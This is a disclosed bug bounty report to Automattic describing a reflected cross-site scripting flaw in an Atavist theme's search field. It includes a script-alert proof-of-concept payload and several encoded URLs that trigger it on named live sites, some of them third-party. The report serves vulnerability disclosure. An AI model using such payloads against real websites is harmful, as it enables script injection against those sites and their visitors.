# Reflected XSS on a Atavist theme

## Report Details
- **Report ID**: 947790
- **URL**: https://hackerone.com/reports/947790
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-07-30T11:46:14.695Z
- **Disclosed**: 2020-11-18T14:22:13.129Z

## Reporter
- **Username**: bugra
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
## Summary:
Hi team,
I found Reflected XSS at a Atavist theme and there are a lot of affected websites.
I don't know the theme's name but it's in use at https://magazine.atavist.com/
Just write `<script>alert(document.domain)</script>` to  search field.

https://magazine.atavist.com/search?search=%3Cscript%3Ealert(document.domain)%3C/script%3E
https://docs.atavist.com/search?search=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

Also there are more affected websites like http://www.377union.com/search?search=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E , http://www.lifeaftermaria.org/search?search=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E etc.

So, I think the scope of this vulnerability is very large.

## Impact

Reflected XSS

Thanks,
Bugra

## Attachments
No attachments
